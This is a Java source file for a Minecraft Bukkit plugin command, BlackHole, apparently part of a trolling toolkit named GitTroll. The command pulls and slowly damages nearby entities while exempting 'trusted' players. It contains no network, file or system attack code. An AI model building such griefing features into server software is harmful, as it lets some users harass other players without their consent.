package net.Lenni0451.GitTroll.command.commands.world;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.Effect;
import org.bukkit.Location;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class BlackHole extends CommandBase {
	
	private Location location = null;

	public BlackHole() {
		super("BlackHole", "Spawn a black hole which sucks in everything around it");
		
		Bukkit.getScheduler().runTaskTimer(GitTroll.getInstance(), () -> {
			if(location == null) {
				return;
			}
			
			for(int i = 0; i < 100; i++)
				location.getWorld().playEffect(location, Effect.PARTICLE_SMOKE, 1, 1000);
			
			try {
				double divider = 9;
				int range = 20;
				for(Entity entity : location.getWorld().getNearbyEntities(location, range, range, range)) {
					if(entity instanceof Player && CustomPlayer.instanceOf((Player) entity).isTrusted()) {
						continue;
					}
					try {
						if(entity.getLocation().distance(location) < range) {
							entity.setVelocity(new Vector((location.getX() - entity.getLocation().getX()) / divider, (location.getY() - entity.getLocation().getY()) / divider, (location.getZ() - entity.getLocation().getZ()) / divider));
							if(entity instanceof LivingEntity) {
								LivingEntity living = (LivingEntity) entity;
								if(System.currentTimeMillis() % 1000 <= 50) {
									living.damage(0.5);
								}
							}
						}
					} catch (Exception e) {}
				}
			} catch (Throwable e) {}
		}, 1, 1);
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.getLength() == 0) {
			if(location == null) {
				location = executor.getLocation();
				executor.sendGitMessage("The black hole has been spawned.");
			} else {
				location = null;
				executor.sendGitMessage("§cThe black hole has been destroyed.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
}
